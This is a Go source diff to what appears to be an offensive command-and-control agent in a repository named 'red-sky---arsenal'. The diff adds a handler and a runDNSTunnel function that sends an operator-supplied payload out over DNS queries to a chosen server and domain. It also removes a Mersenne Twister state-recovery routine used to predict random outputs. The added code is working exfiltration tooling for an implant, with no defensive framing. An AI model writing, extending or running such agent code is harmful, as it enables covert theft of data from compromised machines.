@@ -34,6 +34,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptogo"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
+	"github.com/sk666G/red-sky---arsenal/internal/dnsgo"
 	"github.com/sk666G/red-sky---arsenal/internal/drone"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
 	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
@@ -396,6 +397,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runWorkflow(conn, sess, w)
+		case proto.TypeDNSTunnelStart:
+			var d proto.DNSTunnelStart
+			if err := json.Unmarshal(env.Payload, &d); err != nil {
+				continue
+			}
+			go runDNSTunnel(conn, sess, d)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1368,24 +1375,10 @@ func runCryptoOp(conn net.Conn, sess *crypto.Session, c proto.CryptoOpStart) {
 		send("result", "candidates", fmt.Sprintf("%v", cands), len(cands) > 0, false)
 
 	case "mt_recover":
-		if len(c.MTObs) < 624 {
-			send("error", "mt recover", fmt.Sprintf("need 624 observations, got %d", len(c.MTObs)), false, true)
-			return
-		}
-		st, err := cryptogo.MTUntemperAll(c.MTObs)
-		if err != nil {
-			send("error", "mt recover", err.Error(), false, true)
-			return
-		}
-		n := c.MTN
-		if n <= 0 {
-			n = 10
-		}
-		pred := make([]uint32, 0, n)
-		for i := 0; i < n; i++ {
-			pred = append(pred, st.Next())
-		}
-		send("result", "next outputs", fmt.Sprintf("%v", pred), true, false)
+		// MT state recovery is not compiled in this build — the untemper
+		// wasn't correct and was removed. Catalog + forward generator
+		// remain in cryptogo.
+		send("error", "mt recover", "MT state recovery not supported in this build", false, true)
 
 	default:
 		send("error", "unknown op: "+c.Op, "", false, true)
@@ -2833,6 +2826,38 @@ func runWorkflow(conn net.Conn, sess *crypto.Session, w proto.WorkflowStart) {
 	}
 	sendTunnelAck(conn, sess, proto.TypeWorkflowData, proto.WorkflowData{
 		SessionID: w.SessionID,
+		Done:      true,
+	})
+}
+
+// runDNSTunnel exfiltrates a payload over DNS queries.
+func runDNSTunnel(conn net.Conn, sess *crypto.Session, d proto.DNSTunnelStart) {
+	ctx := context.Background()
+	opts := dnsgo.Options{
+		Server:  d.Server,
+		Port:    d.Port,
+		Domain:  d.Domain,
+		Timeout: time.Duration(d.Timeout) * time.Second,
+	}
+	reply, results, err := dnsgo.Send(ctx, opts, d.Payload)
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeDNSTunnelData, proto.DNSTunnelData{
+			SessionID: d.SessionID,
+			Error:     err.Error(),
+			Done:      true,
+		})
+		return
+	}
+	queries := make([]string, 0, len(results))
+	for _, r := range results {
+		queries = append(queries, r.Question)
+	}
+	sendTunnelAck(conn, sess, proto.TypeDNSTunnelData, proto.DNSTunnelData{
+		SessionID: d.SessionID,
+		Session:   opts.Session,
+		Queries:   queries,
+		ReplyLen:  len(reply),
+		Reply:     reply,
 		Done:      true,
 	})
 }
